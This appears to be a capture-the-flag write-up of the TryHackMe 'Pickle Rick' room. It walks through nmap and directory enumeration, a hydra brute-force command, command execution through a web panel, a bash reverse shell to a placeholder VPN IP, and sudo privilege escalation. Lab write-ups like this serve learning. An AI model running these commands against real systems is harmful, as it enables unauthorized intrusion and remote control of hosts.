# Pickle Rick

IP: 10.10.0.135

### Initial scan

`nmap -sC -sV -oN nmap.txt -vv -p- 10.10.0.135`

`-sC` -> default scripts

`-sV` -> tell us the verisons of running services

`-oN nmap.txt` -> write the ouput into a file called 'nmap.txt'

`-vv` -> set verbosity to level 2

`-p-` -> scan all ports

### Open Ports

80 meaning an http server and 22 which is ssh

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:12:ce:df:f7:9a:2b:9e:97:7d:c1:39:e4:3c:df:48 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4foPbmOjfcIrXu3IJCBFcHjm0rHko8N1WsXQLum5p740xUrBgcL8tfW1HY9hkyuK+jcUX5YLSUVFvNDnMFYwD4trWdieY+XvKFQg+OApJBE3THPkiXhkU8FfiubEsQ8UD7gEEHZsxjKL8PMrsCQIxpY+r7ClLFT3KPry82IaZC4Iecq6SZLXJUCi84ZzMBV0+zrV3QH+5U3ywVmBGu9fJiEbBoHaOm51/vhNx7451U6Socojjr2md3kr1VnPYmHiECg/D7P9NG9p+UD4ZmGdjkPSxYOLVb9qW7VKh/QPro/8TKz3Xgsz2cM0VwOIwKy2LvfbkPvXjW002pPcTLGGp
|   256 1e:83:24:55:dc:41:c3:14:08:0d:f8:2b:ab:40:bf:0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFHxx3PVd2BRCPBf2gOQtxGB8qjtct/augcA5gsxgoM9wm+rufC0o5/8TWrcZIwxYOhuVwGzGqhOTDo2Rso3oZk=
|   256 ff:20:ec:03:c6:82:02:7b:1f:5a:cd:fb:65:5c:ee:e7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMVagIW9FgwDEjyxoefbfWBpRdA3e2hkmGs/1PAplz0M
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web enumeration

Using my tool webctf, we can see that the page has a username in the comments!

```
webctf http://10.10.0.135/ --comments

=============
COMMENTS
=============

[+] 1 :  

    Note to self, remember username!

    Username: R1ckRul3s

```
We have a username, time to start gobuster!

`gobuster dir -u http://10.10.0.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25`

running gobuster like this didnt get me much, so I ran dirbuster. Looked for extensions `.php .js .txt .py`

#### Dirbuster results

Only the interesting stuff

```
/login.php
/portal.php
/robots.txt
```
`portal.php` redirects to `login.php`.... just like a portal!

We get a login page, so time for some burp.

When sending a login request, the following parameters are sent to the server

`username=R1ckRul3s&password=p1ckl3&sub=Login`

This screams hydra to me.

`hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt http://10.10.0.135 http-post-form/login.php:username=^USER^&password=^PASS^&sub=Login:Invalid username or password." -V -f -t 15`

Since this wasn't returning anything for quite sometime I looked at robots.txt 

```
Wubbalubbadubdub
``` 
Could this be a password? (Hint: Yes)

## What is the first ingredient Rick needs?

We have entered into `/portal.php` what could we do here? 

The welcome page has a command panel, lets try and use it!

Before that, I quickly checked out the sourc code, found an interesting comment
```
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```
This turned out to be a dead end. So i typed `ls` into the command prompt and viola

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```
at /Sup3rS3cretPickl3Ingred.txt we have the first ingredient, and there is also a clue.txt!

## Whats the second ingredient Rick needs?

clue: `Look around the file system for the other ingredient.` So let's do that. By trying `cd ..; pwd` I found out that we can move around. Could we maybe get a reverse shell??

`/bin/bash -i >& /dev/tcp/YOUR_THM_VPN_IP/8888 0>&1` and ran `nc -lvnp 8888` in another tab. But no luck.

After playing around a bit, I found `/home/rick/second ingredient` but the `cat` command is disabled! 
What else could we do? Well, how about a python http server. 

`which python3` shows that python3 is installed, so lets try it.


<b>WARNING dont do this! I had to restart my room instance</b>

I tried being creative, wasnt worth it :D Just use the `less` command on the file.

`cd /home/rick; python3 -m http.server --bind 10.10.0.135 8888` the site hangs, so it is running! Visit it on the correct port, and viola again. 

## Whats the final ingredient Rick needs?

Now, how can we escelate to the root user and find our last ingredient?

running `sudo -l` to see what we can do as sudo.... well

```
User www-data may run the following commands on ip-10-10-238-28.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

We can do anything. So lets try `sudo -la /root/`

Output:

```
.
..
.bashrc
.profile
.ssh
3rd.txt
snap
```
Now just `sudo less` the file, and there we go!
